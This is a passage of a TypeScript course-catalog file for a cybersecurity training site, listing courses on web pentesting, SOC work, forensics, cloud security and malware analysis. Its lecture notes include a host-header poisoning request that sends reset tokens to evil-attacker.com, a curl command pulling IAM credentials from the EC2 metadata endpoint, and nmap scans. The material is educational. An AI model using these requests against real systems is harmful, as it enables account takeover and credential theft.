import { Course } from '../types';

export const COURSES: Course[] = [
  {
    id: 'course-web-vapt',
    slug: 'practical-web-application-penetration-testing',
    title: 'Practical Web Application Penetration Testing (OWASP & Beyond)',
    category: 'Web Application Security',
    difficulty: 'Intermediate',
    duration: '28 Hours',
    modulesCount: 6,
    lessonsCount: 24,
    pricePKR: 12500,
    priceUSD: 45,
    isPremium: true,
    badge: 'Flagship Program',
    description: 'Master practical web security testing from discovery to proof-of-concept exploitation. Hands-on coverage of OWASP Top 10, modern API flaws, and Burp Suite workflows.',
    detailedOverview: 'Designed for aspiring penetration testers and security analysts, this comprehensive course teaches practical methodology for discovering vulnerabilities in modern web applications and REST APIs without relying exclusively on automated scanners.',
    instructor: {
      name: 'Muhammad Zaib Zafar',
      role: 'Security Analyst & Penetration Tester',
      bio: 'Cybersecurity practitioner specializing in Vulnerability Assessment and Penetration Testing (VAPT), compliance monitoring, and incident triage.',
      certifications: ['Certified Ethical Hacker (CEH v12)', 'Wazuh SOC Analyst', 'OWASP Contributor']
    },
    skills: [
      'Burp Suite Professional Suite',
      'SQL Injection & Bypass Techniques',
      'XSS Filter Evasion & Dom Exploitation',
      'IDOR & Broken Access Control Discovery',
      'API Security Testing (JWT & GraphQL)',
      'Vulnerability Reporting & CVSS Scoring'
    ],
    prerequisites: [
      'Understanding of HTTP/HTTPS protocol fundamentals',
      'Basic familiarity with HTML, JavaScript, and SQL syntax',
      'Linux command line basics'
    ],
    labsIncluded: ['lab-sqli-bypass', 'lab-idor-privilege', 'lab-xss-exploitation'],
    chapters: [
      {
        id: 'ch-1',
        chapterNumber: 1,
        title: 'Methodology & Lab Setup',
        description: 'Establish a testing workstation with Burp Suite, proxy setup, and legal boundaries.',
        lessons: [
          {
            id: 'les-1-1',
            title: 'Welcome & Offensive Testing Methodology',
            duration: '18 min',
            isFree: true,
            summary: 'Understanding the scope, rules of engagement, and ethical testing standards.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/2_lswM1S264',
            videoType: 'youtube',
            lectureNotes: `# Lecture 1.1: Testing Methodology & Engagement Standards

### Core Principles
1. **Explicit Written Authorization**: Never conduct security tests without signed scope boundaries.
2. **Scope Delineation**: Differentiate in-scope production targets from third-party APIs and CDNs.
3. **Evidence Preservation**: Document every HTTP request/response artifact with timestamps.

### Testing Workflow
- Scope Confirmation & Target Definition
- Passive & Active Reconnaissance
- Threat Modeling & Attack Surface Mapping
- Vulnerability Identification & PoC Validation
- Risk Impact Analysis (CVSS 3.1 Framework)
- Remediation Guidance & Retesting`
          },
          {
            id: 'les-1-2',
            title: 'Burp Suite Setup: CA Certificates, Proxying & Scope',
            duration: '26 min',
            isFree: true,
            summary: 'Configuring Chromium with Burp Proxy, installing the root CA, and building advanced regex scope filters.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/3Kq1MIfTWCE',
            videoType: 'youtube',
            lectureNotes: `# Lecture 1.2: Burp Suite Setup & Scope Configuration

### 1. Root CA Installation
- Export Certificate in DER format from \`http://burp\`
- Import into browser Trusted Root Certification Authorities store
- Validate TLS handshake interception without certificate warning prompts

### 2. Advanced Scope Regex
\`\`\`regex
^https?://.*\\.targetdomain\\.com(:\\d+)?/
\`\`\`

### 3. Key Burp Tabs
- **Target > Site Map**: Hierarchy of spidered resources
- **Proxy > HTTP History**: Live traffic stream
- **Repeater**: Manual payload tampering
- **Intruder**: Automated fuzzing with Sniper/Battering Ram modes`
          },
          {
            id: 'les-1-3',
            title: 'Passive Reconnaissance & Attack Surface Mapping',
            duration: '32 min',
            isFree: false,
            summary: 'Subdomain enumeration, JS asset parsing, endpoint extraction with ffuf and Katana.'
          },
          {
            id: 'les-1-4',
            title: 'Modern Web Architecture & Request Smuggling Concepts',
            duration: '29 min',
            isFree: false,
            summary: 'Reverse proxies, CDN caching behaviors, and HTTP header anomalies.'
          }
        ]
      },
      {
        id: 'ch-2',
        chapterNumber: 2,
        title: 'Authentication & Session Weaknesses',
        description: 'Exploiting flawed password resets, JWT signature tampering, and session token fixation.',
        lessons: [
          {
            id: 'les-2-1',
            title: 'Password Reset Flaws & Host Header Injection',
            duration: '24 min',
            isFree: true,
            summary: 'PoC demonstration of poisoning password reset tokens via manipulated Host and X-Forwarded-Host headers.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/Vb8QWJ0kRms',
            videoType: 'youtube',
            lectureNotes: `# Lecture 2.1: Host Header Poisoning in Password Resets

### Vulnerability Mechanism
When applications generate password reset links using HTTP request headers rather than a static configuration:
\`\`\`http
POST /api/v1/auth/reset-password HTTP/1.1
Host: evil-attacker.com
X-Forwarded-Host: evil-attacker.com
Content-Type: application/json

{"email": "victim@target.com"}
\`\`\`

If backend uses \`req.headers['host']\` to construct reset email:
\`https://evil-attacker.com/reset?token=a8f0923b...\`
The user's secret reset token is logged on the attacker's HTTP server.`
          },
          {
            id: 'les-2-2',
            title: 'JWT Attack Vectors: "None" Algorithm & Secret Key Cracking',
            duration: '35 min',
            isFree: false,
            summary: 'Exploiting weak HMAC secrets, jku header injections, and algorithmic confusion in JSON Web Tokens.'
          },
          {
            id: 'les-2-3',
            title: 'Multi-Factor Authentication (MFA) Bypasses',
            duration: '27 min',
            isFree: false,
            summary: 'Rate limit absence, response manipulation (HTTP 200 patching), and direct endpoint traversal.'
          }
        ]
      },
      {
        id: 'ch-3',
        chapterNumber: 3,
        title: 'Injection Attacks: SQLi & Command Injection',
        description: 'In-depth SQL injection from classic error-based to blind time-based and second-order payloads.',
        lessons: [
          {
            id: 'les-3-1',
            title: 'Error-Based & UNION-Based SQL Injection',
            duration: '38 min',
            isFree: false,
            summary: 'Enumerating database schemas, columns, and extracting sensitive password hashes using UNION SELECT.'
          },
          {
            id: 'les-3-2',
            title: 'Blind Boolean & Time-Based Extraction Scripts',
            duration: '45 min',
            isFree: false,
            summary: 'Crafting Python automation scripts to extract character-by-character database content under strict filters.'
          },
          {
            id: 'les-3-3',
            title: 'OS Command Injection & Reverse Shell Chaining',
            duration: '30 min',
            isFree: false,
            summary: 'Exploiting input fields that concatenate unsanitized shell commands, bypassing spaces and character filters.'
          }
        ]
      },
      {
        id: 'ch-4',
        chapterNumber: 4,
        title: 'Broken Access Control & IDOR',
        description: 'The #1 OWASP risk: exploiting horizontal and vertical authorization bypasses.',
        lessons: [
          {
            id: 'les-4-1',
            title: 'Horizontal vs Vertical IDOR Discovery',
            duration: '31 min',
            isFree: false,
            summary: 'Systematic testing of user IDs, UUID v1 predictability, and multi-tenant authorization barriers.'
          },
          {
            id: 'les-4-2',
            title: 'Method Tampering & Hidden Administrative Endpoints',
            duration: '22 min',
            isFree: false,
            summary: 'Switching GET/POST/PUT/DELETE verbs to bypass route middleware authorization filters.'
          }
        ]
      },
      {
        id: 'ch-5',
        chapterNumber: 5,
        title: 'Client-Side Vulnerabilities & API Security',
        description: 'Cross-Site Scripting (Reflected, Stored, DOM), CSRF, CORS misconfigurations, and GraphQL security.',
        lessons: [
          {
            id: 'les-5-1',
            title: 'Context-Aware XSS & WAF Evasion',
            duration: '34 min',
            isFree: false,
            summary: 'Executing script payloads across HTML body, attribute contexts, script blocks, and SVG elements.'
          },
          {
            id: 'les-5-2',
            title: 'GraphQL Introspection & Batching Attacks',
            duration: '28 min',
            isFree: false,
            summary: 'Extracting GraphQL schemas, querying unauthorized mutations, and abusing batch queries for brute forcing.'
          }
        ]
      },
      {
        id: 'ch-6',
        chapterNumber: 6,
        title: 'Professional Reporting & Remediation Verification',
        description: 'Translating technical findings into executive summaries, CVSS 3.1 scores, and verifying patches.',
        lessons: [
          {
            id: 'les-6-1',
            title: 'Writing Industry-Standard Penetration Testing Reports',
            duration: '25 min',
            isFree: false,
            summary: 'Structuring executive summaries, reproduction steps, technical evidence, and actionable fixes.'
          },
          {
            id: 'les-6-2',
            title: 'Final Capstone Assessment & Certificate Examination',
            duration: '60 min',
            isFree: false,
            summary: 'Comprehensive lab assessment requiring candidates to submit valid proof-of-concept reports.'
          }
        ]
      }
    ]
  },
  {
    id: 'course-soc-analyst',
    slug: 'soc-analyst-blue-team-defense-wazuh',
    title: 'SOC Analyst & Blue Team Defense with Wazuh SIEM',
    category: 'SOC & Blue Team',
    difficulty: 'Beginner',
    duration: '22 Hours',
    modulesCount: 5,
    lessonsCount: 18,
    pricePKR: 11000,
    priceUSD: 40,
    isPremium: true,
    badge: 'Popular',
    description: 'Learn SOC tier-1 and tier-2 operations. Deploy Wazuh SIEM, write detection rules, analyze Windows event logs, and hunt cyber threats.',
    detailedOverview: 'Built around real defensive security workflows, this course takes you from foundational log analysis to active threat triage using the open-source Wazuh SIEM and XDR platform.',
    instructor: {
      name: 'Muhammad Zaib Zafar',
      role: 'Security Analyst & Penetration Tester',
      bio: 'Wazuh SOC practitioner with extensive experience deploying endpoint compliance and active detection rules.',
      certifications: ['Wazuh Certified Specialist', 'CEH v12']
    },
    skills: [
      'Wazuh Manager, Indexer & Dashboard Deployment',
      'SIEM Alert Triage & False Positive Filtering',
      'Windows Event ID Analysis (4624, 4625, 4688, 7045)',
      'Sysmon Configuration & Threat Hunting',
      'MITRE ATT&CK Matrix Mapping',
      'Active Response & Incident Containment'
    ],
    prerequisites: [
      'Basic networking concepts (IP, DNS, ports, routing)',
      'Familiarity with virtual machines (VirtualBox/VMware)'
    ],
    labsIncluded: ['lab-wazuh-siem', 'lab-incident-response'],
    chapters: [
      {
        id: 'soc-ch-1',
        chapterNumber: 1,
        title: 'SOC Fundamentals & Architecture',
        description: 'Roles, workflows, shift handovers, and SIEM/EDR foundational architecture.',
        lessons: [
          {
            id: 'soc-les-1-1',
            title: 'The Modern Security Operations Center (SOC)',
            duration: '20 min',
            isFree: true,
            summary: 'Understanding Tier 1 (Triage), Tier 2 (Incident Response), Tier 3 (Threat Hunting), and SIEM integration.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/9w_0k8t7eXg',
            videoType: 'youtube',
            lectureNotes: `# SOC Architecture & Analyst Responsibilities

### Analyst Tiers
- **Tier 1 (Triage Analyst)**: Monitors SIEM alert queue, verifies true vs false positives, performs initial log correlation.
- **Tier 2 (Incident Responder)**: Deep forensic inspection, endpoint isolation, malicious process kill, lateral movement scoping.
- **Tier 3 (Threat Hunter / Lead)**: Proactive hypothesis-based hunting, custom detection rule creation, adversary intelligence integration.

### Core Metrics
- **MTTD**: Mean Time to Detect
- **MTTR**: Mean Time to Respond / Remediate`
          },
          {
            id: 'soc-les-1-2',
            title: 'Wazuh Architecture: Agent, Manager & Indexer',
            duration: '28 min',
            isFree: true,
            summary: 'How endpoint agents stream encrypted events to the Wazuh Manager for real-time decoding and rule evaluation.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/jZ_jXg7Y4eQ',
            videoType: 'youtube',
            lectureNotes: `# Wazuh SIEM Architecture Overview

### Architecture Components
1. **Wazuh Agent**: Lightweight C daemon on Windows/Linux endpoints that monitors system logs, file integrity (FIM), and open ports.
2. **Wazuh Manager**: Analyzes data against decoders and rulesets, correlates anomalies, and executes active responses.
3. **Wazuh Indexer**: Highly scalable OpenSearch engine that indexes alerts and telemetry.
4. **Wazuh Dashboard**: Web interface for search, dashboards, compliance monitoring, and alert investigation.`
          },
          {
            id: 'soc-les-1-3',
            title: 'Deploying Wazuh in a Virtual Sandbox',
            duration: '35 min',
            isFree: false,
            summary: 'Step-by-step installation of Wazuh all-in-one assistant on Ubuntu Linux.'
          }
        ]
      },
      {
        id: 'soc-ch-2',
        chapterNumber: 2,
        title: 'Log Analysis & Critical Event IDs',
        description: 'Mastering Windows Security Logs and Linux auditd.',
        lessons: [
          {
            id: 'soc-les-2-1',
            title: 'Windows Security Event Log Deep Dive',
            duration: '32 min',
            isFree: false,
            summary: 'Analyzing Event ID 4624 (Successful Logon), 4625 (Failed Logon), 4672 (Admin Privileges), and 7045 (New Service Installed).'
          },
          {
            id: 'soc-les-2-2',
            title: 'Sysmon Implementation for Process Tracking',
            duration: '40 min',
            isFree: false,
            summary: 'Deploying SwiftOnSecurity Sysmon config to record Process Creation (Event 1) and Network Connections (Event 3).'
          }
        ]
      },
      {
        id: 'soc-ch-3',
        chapterNumber: 3,
        title: 'Custom Detection Rules & MITRE ATT&CK',
        description: 'Authoring custom XML rules in Wazuh to catch mimikatz and living-off-the-land binaries.',
        lessons: [
          {
            id: 'soc-les-3-1',
            title: 'Writing Wazuh XML Detection Rules',
            duration: '36 min',
            isFree: false,
            summary: 'Creating parent/child rule definitions, regex matching, and level tuning.'
          },
          {
            id: 'soc-les-3-2',
            title: 'Mapping Alerts to MITRE ATT&CK Techniques',
            duration: '30 min',
            isFree: false,
            summary: 'Correlating T1059 (Command & Scripting Interpreter) and T1003 (OS Credential Dumping).'
          }
        ]
      }
    ]
  },
  {
    id: 'course-network-defense',
    slug: 'network-security-packet-analysis-wireshark',
    title: 'Network Security & Deep Packet Inspection with Wireshark',
    category: 'Network Security',
    difficulty: 'Beginner',
    duration: '18 Hours',
    modulesCount: 4,
    lessonsCount: 16,
    pricePKR: 8500,
    priceUSD: 30,
    isPremium: true,
    badge: 'Fundamental',
    description: 'Deconstruct TCP/IP streams, troubleshoot malicious traffic, detect ARP spoofing, and identify data exfiltration.',
    detailedOverview: 'Packet analysis is the ground truth of cybersecurity. This course teaches how to capture, filter, and dissect real-world network traffic during normal operations and active attacks.',
    instructor: {
      name: 'Muhammad Zaib Zafar',
      role: 'Security Analyst & Penetration Tester',
      bio: 'Network defense specialist with focus on traffic anomaly detection and protocol auditing.',
      certifications: ['Wireshark Certified Network Analyst', 'Network+']
    },
    skills: [
      'Wireshark Display & Capture Filters',
      'TCP Handshake & Reset Anomaly Analysis',
      'DNS Tunneling & C2 Traffic Identification',
      'TLS Handshake & Certificate Verification',
      'HTTP Traffic Extraction & Credential Hunting'
    ],
    prerequisites: ['Basic understanding of IP addressing and subnets'],
    labsIncluded: ['lab-wireshark-pcap', 'lab-firewall-rules'],
    chapters: [
      {
        id: 'net-ch-1',
        chapterNumber: 1,
        title: 'Packet Analysis Foundations',
        description: 'OSI vs TCP/IP model, capture interfaces, and promiscous mode.',
        lessons: [
          {
            id: 'net-les-1-1',
            title: 'The Anatomy of an Ethernet Frame & IP Packet',
            duration: '22 min',
            isFree: true,
            summary: 'Inspecting MAC headers, TTL fields, TCP flags (SYN, ACK, FIN, RST, PSH, URG).',
            videoUrl: 'https://www.youtube-nocookie.com/embed/O_eBfF03yps',
            videoType: 'youtube',
            lectureNotes: `# Anatomy of a Network Packet

### TCP Three-Way Handshake
1. Client sends \`[SYN]\` with initial sequence number SEQ=X
2. Server responds with \`[SYN, ACK]\` with SEQ=Y, ACK=X+1
3. Client completes with \`[ACK]\` with SEQ=X+1, ACK=Y+1

### Suspicious TCP Flags
- **SYN Scans**: Thousands of SYN requests without matching ACKs
- **Null / Xmas Scans**: Abnormal flag combinations used by Nmap to bypass stateful firewalls`
          },
          {
            id: 'net-les-1-2',
            title: 'Mastering Wireshark Display Filters',
            duration: '28 min',
            isFree: true,
            summary: 'Using boolean logic, protocol expressions, and byte offsets to isolate attack packets.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/OU-A2EmVrKQ',
            videoType: 'youtube',
            lectureNotes: `# Essential Wireshark Display Filters

\`\`\`wireshark
// DNS query anomalies
dns.flags.response == 0 and dns.qry.name contains "evil"

// Cleartext HTTP POST containing credentials
http.request.method == "POST" and (http contains "password" or http contains "token")

// TCP Retransmissions & Resets indicating SYN flood or RST attacks
tcp.analysis.retransmission or tcp.flags.reset == 1
\`\`\``
          },
          {
            id: 'net-les-1-3',
            title: 'Detecting ARP Spoofing & Man-in-the-Middle Attacks',
            duration: '31 min',
            isFree: false,
            summary: 'Catching duplicate MAC addresses claiming the default gateway IP.'
          }
        ]
      }
    ]
  },
  {
    id: 'course-digital-forensics',
    slug: 'practical-digital-forensics-incident-response',
    title: 'Practical Digital Forensics & Incident Response (DFIR)',
    category: 'Digital Forensics',
    difficulty: 'Advanced',
    duration: '26 Hours',
    modulesCount: 5,
    lessonsCount: 20,
    pricePKR: 14000,
    priceUSD: 50,
    isPremium: true,
    badge: 'Advanced',
    description: 'Acquire disk and RAM evidence, analyze Master File Tables (MFT), extract volatile artifacts, and build intrusion timelines.',
    detailedOverview: 'Learn how to perform forensically sound investigations following cyber intrusions, preserving cryptographic hashes and extracting artifact timelines.',
    instructor: {
      name: 'Muhammad Zaib Zafar',
      role: 'Security Analyst & Penetration Tester',
      bio: 'Investigates host artifacts, registry anomalies, and memory injection footprints.',
      certifications: ['DFIR Practitioner', 'CEH v12']
    },
    skills: [
      'Volatility 3 Memory Analysis',
      'Autopsy Disk Artifact Investigation',
      'Prefetch & Shimcache Execution Proving',
      'Cryptographic Evidence Preservation (MD5/SHA256)',
      'Timeline Analysis with Plaso / log2timeline'
    ],
    prerequisites: ['Comfortable with Windows internal architecture and CLI'],
    labsIncluded: ['lab-memory-dump', 'lab-disk-forensics'],
    chapters: [
      {
        id: 'df-ch-1',
        chapterNumber: 1,
        title: 'Evidence Preservation & Volatile Memory',
        description: 'Order of volatility, RAM capture, and Volatility 3 command plugin usage.',
        lessons: [
          {
            id: 'df-les-1-1',
            title: 'Order of Volatility & Forensic Soundness',
            duration: '24 min',
            isFree: true,
            summary: 'RFC 3227 guidelines: Memory, caches, network status, disk storage, and chain of custody documentation.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/Y0rLwz3mFvY',
            videoType: 'youtube',
            lectureNotes: `# RFC 3227: Order of Volatility

1. Registers & Cache memory
2. Routing table, ARP cache, process table, kernel statistics, RAM
3. Temporary file systems
4. Disks & non-volatile storage
5. Remote logging and monitoring data
6. Physical configuration & network topology
7. Archival media & backup tapes`
          },
          {
            id: 'df-les-1-2',
            title: 'Volatility 3: Finding Process Injections',
            duration: '38 min',
            isFree: true,
            summary: 'Running windows.pslist, windows.pstree, and windows.malfind to detect unmapped memory executable permissions (PAGE_EXECUTE_READWRITE).',
            videoUrl: 'https://www.youtube-nocookie.com/embed/v9_yU9QZkY8',
            videoType: 'youtube',
            lectureNotes: `# Volatility 3 Memory Hunting Commands

\`\`\`bash
# 1. Process tree inspection
python3 vol.py -f memory.raw windows.pstree

# 2. Detecting injected code / shellcode in allocated memory pages
python3 vol.py -f memory.raw windows.malfind

# 3. Dump suspicious process memory for static analysis
python3 vol.py -f memory.raw -o ./dumps windows.dumpfiles --pid 1337
\`\`\``
          },
          {
            id: 'df-les-1-3',
            title: 'Master File Table ($MFT) & Timestomping Detection',
            duration: '34 min',
            isFree: false,
            summary: 'Comparing $STANDARD_INFORMATION vs $FILE_NAME timestamps to detect anti-forensic date tampering.'
          }
        ]
      }
    ]
  },
  {
    id: 'course-cloud-security',
    slug: 'cloud-infrastructure-security-aws-kubernetes',
    title: 'Cloud Security Architecture & AWS IAM Hardening',
    category: 'Cloud Security',
    difficulty: 'Intermediate',
    duration: '20 Hours',
    modulesCount: 4,
    lessonsCount: 15,
    pricePKR: 12000,
    priceUSD: 42,
    isPremium: true,
    description: 'Audit AWS IAM policies, prevent S3 misconfigurations, protect container pipelines, and enforce zero trust.',
    detailedOverview: 'Cloud environments require specialized security models. This course covers cloud attack surfaces, privilege escalation in AWS IAM, and container escape protection.',
    instructor: {
      name: 'Muhammad Zaib Zafar',
      role: 'Security Analyst & Penetration Tester',
      bio: 'Cloud security reviewer with focus on multi-tenant architecture and policy as code.',
      certifications: ['AWS Certified Security Specialist', 'CEH']
    },
    skills: [
      'AWS IAM Privilege Escalation Vectors',
      'S3 Bucket Access Policies & KMS Encryption',
      'Container Vulnerability Auditing with Trivy',
      'Kubernetes RBAC Misconfiguration Detection',
      'CloudTrail Incident Investigation'
    ],
    prerequisites: ['Basic understanding of cloud concepts and JSON/YAML'],
    labsIncluded: ['lab-cloud-iam', 'lab-docker-escape'],
    chapters: [
      {
        id: 'cs-ch-1',
        chapterNumber: 1,
        title: 'Cloud Identity & Access Management (IAM)',
        description: 'Least privilege, wildcard policies, and role assumption security.',
        lessons: [
          {
            id: 'cs-les-1-1',
            title: 'IAM Policy Anatomy & Overprivileged Hazards',
            duration: '21 min',
            isFree: true,
            summary: 'Deconstructing Effect, Action, Resource, and Condition blocks in JSON policies.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/d2-X2kGzL9U',
            videoType: 'youtube',
            lectureNotes: `# AWS IAM Policy Security Principles

### High-Risk Permission Combinations
1. \`iam:CreatePolicyVersion\`
2. \`iam:SetDefaultPolicyVersion\`
3. \`iam:AttachUserPolicy\` / \`iam:AttachRolePolicy\`
4. \`sts:AssumeRole\` with wildcard \`*`
          },
          {
            id: 'cs-les-1-2',
            title: 'AWS Metadata Service (IMDSv1 vs IMDSv2) & SSRF',
            duration: '32 min',
            isFree: true,
            summary: 'Understanding how SSRF exploits the 169.254.169.254 endpoint and why IMDSv2 session tokens prevent unauthorized role theft.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/8k_Z8e0yU9Q',
            videoType: 'youtube',
            lectureNotes: `# IMDSv1 vs IMDSv2 Defense

### IMDSv1 (Vulnerable to simple SSRF):
\`\`\`bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role
\`\`\`

### IMDSv2 (Session token enforced, requires PUT with custom header):
\`\`\`bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role
\`\`\``
          },
          {
            id: 'cs-les-1-3',
            title: 'Auditing S3 Buckets & Preventing Public Leaks',
            duration: '27 min',
            isFree: false,
            summary: 'Enforcing S3 Block Public Access, bucket policies, and access analyzer alerts.'
          }
        ]
      }
    ]
  },
  {
    id: 'course-ethical-hacking-bootcamp',
    slug: 'ethical-hacking-fundamentals-hands-on-bootcamp',
    title: 'Ethical Hacking & Network Penetration Testing Bootcamp',
    category: 'Ethical Hacking',
    difficulty: 'Beginner',
    duration: '30 Hours',
    modulesCount: 7,
    lessonsCount: 28,
    pricePKR: 13500,
    priceUSD: 48,
    isPremium: true,
    badge: 'Complete Bootcamp',
    description: 'Comprehensive offensive security training: Linux fundamentals, active reconnaissance, vulnerability exploitation, and pivoting.',
    detailedOverview: 'From configuring Kali Linux to exploiting vulnerable systems using Nmap, Metasploit, and manual exploitation techniques.',
    instructor: {
      name: 'Muhammad Zaib Zafar',
      role: 'Security Analyst & Penetration Tester',
      bio: 'Practicing ethical hacker committed to structured, hands-on defensive and offensive methodology.',
      certifications: ['CEH v12', 'eJPT', 'Wazuh Specialist']
    },
    skills: [
      'Linux Offensive CLI & Scripting',
      'Port Scanning with Nmap (NSE Scripts)',
      'Vulnerability Exploitation with Metasploit',
      'Password Cracking (Hashcat & Hydra)',
      'Linux & Windows Privilege Escalation'
    ],
    prerequisites: ['None - complete beginner friendly entry track'],
    labsIncluded: ['lab-nmap-recon', 'lab-linux-privesc', 'lab-metasploit'],
    chapters: [
      {
        id: 'eh-ch-1',
        chapterNumber: 1,
        title: 'Offensive Security Fundamentals',
        description: 'Hacker mindset, legal ethics, and configuring your Kali Linux lab.',
        lessons: [
          {
            id: 'eh-les-1-1',
            title: 'Introduction to Ethical Hacking & Legal Scope',
            duration: '19 min',
            isFree: true,
            summary: 'The distinction between Black Hat, Grey Hat, and White Hat operations, NDAs, and authorization letters.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/3Kq1MIfTWCE',
            videoType: 'youtube',
            lectureNotes: `# Ethical Hacking Foundations

### The 5 Phases of Ethical Hacking
1. **Reconnaissance**: Passive & active data gathering
2. **Scanning**: Port enumeration, service fingerprinting, vulnerability matching
3. **Gaining Access**: Exploiting verified vulnerabilities (web, service, network)
4. **Maintaining Access**: Establishing reliable shells, pivoting to internal subnets
5. **Covering Tracks / Reporting**: In ethical pentesting, this means cleaning artifacts and delivering a comprehensive remediation roadmap.`
          },
          {
            id: 'eh-les-1-2',
            title: 'Nmap Scanning Mechanics & NSE Scripts',
            duration: '34 min',
            isFree: true,
            summary: 'TCP SYN scan (-sS), Version detection (-sV), Default scripts (-sC), and timing templates (-T4).',
            videoUrl: 'https://www.youtube-nocookie.com/embed/4t4kBkMsDbY',
            videoType: 'youtube',
            lectureNotes: `# Essential Nmap Commands

\`\`\`bash
# Standard comprehensive initial scan
nmap -sS -sV -sC -T4 -p- -oN target_all_ports.txt 192.168.1.50

# Vulnerability scan using NSE scripts
nmap --script "vuln and safe" -p 80,443,445 192.168.1.50
\`\`\``
          },
          {
            id: 'eh-les-1-3',
            title: 'Metasploit Framework: Listeners & Payloads',
            duration: '36 min',
            isFree: false,
            summary: 'Staged vs non-staged payloads, meterpreter features, and post-exploitation modules.'
          }
        ]
      }
    ]
  },
  {
    id: 'course-malware-analysis',
    slug: 'practical-malware-analysis-ghidra-reverse-engineering',
    title: 'Practical Malware Analysis & Binary Reverse Engineering',
    category: 'Malware Analysis',
    difficulty: 'Advanced',
    duration: '24 Hours',
    modulesCount: 5,
    lessonsCount: 18,
    pricePKR: 14500,
    priceUSD: 52,
    isPremium: true,
    badge: 'Specialized',
    description: 'Dissect PE headers, analyze suspicious Windows APIs, configure isolated sandboxes, and decompile binaries using Ghidra.',
    detailedOverview: 'Designed for reverse engineers and advanced DFIR analysts, this program breaks down static and dynamic malware analysis techniques. Learn to unpack obfuscated payloads, decode C2 traffic, and author high-fidelity YARA rules.',
    instructor: {
      name: 'Muhammad Zaib Zafar',
      role: 'Security Analyst & Penetration Tester',
      bio: 'Reverse engineering specialist focusing on Windows PE binaries, living-off-the-land evasion techniques, and behavioral sandboxing.',
      certifications: ['CEH v12', 'Malware Reverse Engineer', 'Wazuh SOC Specialist']
    },
    skills: [
      'Ghidra Static Decompilation & Disassembly',
      'PE File Structure & Section Header Auditing',
      'Dynamic Analysis in Isolated Cuckoo Sandboxes',
      'API Hooking & Process Injection Detection',
      'YARA Rule Creation & Signature Matching',
      'Anti-Analysis & Anti-Debugging Evasion Bypasses'
    ],
    prerequisites: ['Basic x86/x64 assembly knowledge and C/C++ fundamentals'],
    labsIncluded: ['lab-malware-sandbox', 'lab-yara-rules'],
    chapters: [
      {
        id: 'mal-ch-1',
        chapterNumber: 1,
        title: 'Static Analysis & Safe Workstation Architecture',
        description: 'Host-only networks, snapshot management, and PE file structure inspection.',
        lessons: [
          {
            id: 'mal-les-1-1',
            title: 'Malware Analysis Lab Setup & Safe Sandboxing',
            duration: '22 min',
            isFree: true,
            summary: 'Hardening host-only virtual machines (FLARE VM, REMnux), disabling network adapters, and setting baseline snapshots.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/v9_yU9QZkY8',
            videoType: 'youtube',
            lectureNotes: `# Safe Malware Workstation Setup

### Safety Rules:
1. **Isolated Virtual Network**: Always select "Host-Only" or "Internal Network" in hypervisors.
2. **Read-Only Shared Folders**: Never enable bidirectional copy-paste or automatic shared folders during execution.
3. **Pre-Execution Snapshots**: Take a clean snapshot prior to detonating samples.

### Standard Toolset:
- **REMnux**: Linux toolkit for reverse engineering and simulating fake network services (INetSim).
- **FLARE VM**: Windows environment armed with Ghidra, x64dbg, PEStudio, and Process Hacker.`
          },
          {
            id: 'mal-les-1-2',
            title: 'PE Header Inspection & Suspicious Imports',
            duration: '29 min',
            isFree: true,
            summary: 'Using PEStudio and pestr to analyze .text, .rdata, .data sections, high entropy (indicating packing), and suspicious APIs.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/2_lswM1S264',
            videoType: 'youtube',
            lectureNotes: `# PE Header Analysis

### Key Indicators of Compromise in Headers:
- **Entropy > 7.0**: Indicates packed, compressed, or encrypted payload sections.
- **Suspicious API Imports**:
  - \`VirtualAllocEx\`, \`WriteProcessMemory\`, \`CreateRemoteThread\` (Classic Process Injection)
  - \`IsDebuggerPresent\`, \`CheckRemoteDebuggerPresent\` (Anti-Debugging checks)
  - \`InternetOpenUrlA\`, \`URLDownloadToFileA\` (C2 Stagers)`
          },
          {
            id: 'mal-les-1-3',
            title: 'Static Decompilation in Ghidra & Function Renaming',
            duration: '35 min',
            isFree: false,
            summary: 'Loading stripped binaries into Ghidra, identifying main() entry points, tracking cross-references (XREFs), and resolving obfuscated strings.'
          }
        ]
      }
    ]
  },
  {
    id: 'course-cryptography',
    slug: 'applied-cryptography-pki-post-quantum-defense',
    title: 'Applied Cryptography, PKI & Enterprise Key Management',
    category: 'Cryptography',
    difficulty: 'Intermediate',
    duration: '20 Hours',
    modulesCount: 4,
    lessonsCount: 16,
    pricePKR: 11500,
    priceUSD: 40,
    isPremium: true,
    badge: 'Mathematical Core',
    description: 'Master AES-GCM, RSA, ECC, TLS 1.3 handshakes, public key infrastructure (PKI), zero-knowledge concepts, and quantum resistance.',
    detailedOverview: 'Without robust cryptography, modern communications crumble. This course walks security engineers through the mathematics, implementation pitfalls, padding oracle attacks, and enterprise certificate management.',
    instructor: {
      name: 'Muhammad Zaib Zafar',
      role: 'Security Analyst & Penetration Tester',
      bio: 'Applied cryptography reviewer researching secure key derivation, TLS cipher suites, and modern algorithm transitions.',
      certifications: ['CEH v12', 'Applied Cryptography Specialist']
    },
    skills: [
      'AES-GCM Authenticated Encryption Implementation',
      'Elliptic Curve Cryptography (ECDSA & Ed25519)',
      'TLS 1.3 Handshake Dissection & Ephemeral Diffie-Hellman',
      'Password Hashing (Argon2id vs Bcrypt vs PBKDF2)',
      'X.509 Certificate Chain & PKI Revocation (OCSP/CRL)',
      'Padding Oracle & Nonce Reuse Cryptanalysis'
    ],
    prerequisites: ['Basic modular arithmetic and general programming logic'],
    labsIncluded: ['lab-crypto-break', 'lab-tls-handshake'],
    chapters: [
      {
        id: 'cry-ch-1',
        chapterNumber: 1,
        title: 'Symmetric Encryption & Block Cipher Modes',
